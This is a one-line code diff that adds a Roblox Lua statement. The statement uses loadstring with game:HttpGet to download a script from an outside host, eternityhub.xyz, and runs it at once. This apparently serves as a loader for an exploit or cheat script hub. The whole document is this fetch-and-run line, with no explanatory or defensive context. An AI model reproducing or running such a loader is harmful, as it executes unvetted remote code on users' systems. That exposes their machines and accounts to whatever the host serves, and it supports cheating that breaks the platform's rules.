@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://eternityhub.xyz/HostStuff/JayzRoblox.lua"))()
